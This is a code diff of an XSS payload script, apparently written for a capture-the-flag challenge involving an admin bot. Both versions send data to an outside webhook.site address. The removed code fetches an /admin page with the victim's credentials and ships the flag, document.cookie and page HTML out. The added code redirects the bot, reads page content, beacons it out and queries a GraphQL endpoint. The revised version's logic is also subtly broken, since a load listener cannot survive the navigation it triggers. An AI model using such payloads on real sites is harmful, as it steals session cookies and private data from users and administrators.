@@ -1,60 +1,35 @@
 <script>
-  console.log('Starting exploit from:', window.location.origin);
-  console.log('Cookies:', document.cookie);
+  // Instead of fetching, make the bot NAVIGATE to admin page
+  // Then we can read the content from the same-origin page
   
-  // Test which origin we're on
-  fetch('http://94.237.61.52:42667/admin', { 
-    credentials: 'include',
-    mode: 'cors'
-  })
-    .then(r => {
-      console.log('Response status:', r.status, r.statusText);
-      return r.text();
+  // Step 1: Navigate to admin page
+  window.location.href = 'http://94.237.61.52:42667/admin';
+  
+  // Step 2: After navigation, extract the flag
+  // We need to wait for the page to load
+  window.addEventListener('load', function() {
+    // This code runs AFTER the bot navigates to the admin page
+    const h4Element = document.querySelector('h4');
+    const flag = h4Element ? h4Element.textContent : 'NO_H4_FOUND';
+    
+    // Send flag back to webhook
+    new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?flag=' + encodeURIComponent(flag);
+    
+    // Also send the entire page HTML
+    new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?html_len=' + document.documentElement.innerHTML.length;
+    
+    // Try to get more data via GraphQL (now on same origin)
+    fetch('/graphql', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      credentials: 'include',
+      body: JSON.stringify({
+        query: `query { incidentReports { id title } }`
+      })
     })
-    .then(html => {
-      console.log('Got HTML length:', html.length);
-      
-      // Multiple extraction methods
-      let flag = 'NOT_FOUND';
-      
-      // 1. Look for h4 tag
-      const h4Match = html.match(/<h4>([^<]+)<\/h4>/);
-      if (h4Match) {
-        flag = h4Match[1].trim();
-        console.log('Found flag in h4:', flag);
-      }
-      
-      // 2. Look for flag pattern
-      if (flag === 'NOT_FOUND') {
-        const flagPattern = html.match(/flag{.*?}/i);
-        if (flagPattern) {
-          flag = flagPattern[0];
-          console.log('Found flag pattern:', flag);
-        }
-      }
-      
-      // 3. Send to webhook with metadata
-      const payload = {
-        flag: flag,
-        cookies: document.cookie,
-        origin: window.location.origin,
-        url: window.location.href,
-        htmlPreview: html.substring(0, 1000),
-        timestamp: new Date().toISOString()
-      };
-      
-      // Multiple delivery methods
-      new Image().src = `https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?simple_flag=${encodeURIComponent(flag)}`;
-      
-      fetch('https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: JSON.stringify(payload)
-      });
-      
-    })
-    .catch(err => {
-      console.error('Fetch error:', err);
-      new Image().src = `https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?fetch_error=${encodeURIComponent(err.message)}`;
+    .then(r => r.json())
+    .then(data => {
+      new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?reports=' + data.data.incidentReports.length;
     });
+  }, {once: true});
 </script>
